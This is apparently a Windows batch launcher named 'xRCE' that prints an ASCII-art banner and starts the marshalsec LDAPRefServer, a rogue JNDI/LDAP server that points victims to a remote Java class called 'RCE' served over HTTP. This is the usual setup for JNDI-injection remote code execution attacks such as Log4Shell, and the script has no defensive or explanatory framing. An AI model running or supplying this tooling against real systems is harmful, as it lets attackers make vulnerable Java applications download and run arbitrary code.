@echo off
title xRCE
cd marshalsec
echo          8888888b.   .d8888b.  8888888888 
echo         888   Y88b d88P  Y88b 888        
echo         888    888 888    888 888        
echo 888  888 888   d88P 888        8888888    
echo `Y8bd8P' 8888888P'  888        888        
echo  X88K   888 T88b   888    888 888        
echo .d8''8b. 888  T88b  Y88b  d88P 888        
echo 888  888 888   T88b  'Y8888P'  8888888888 
echo.
echo JNDI Server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#RCE"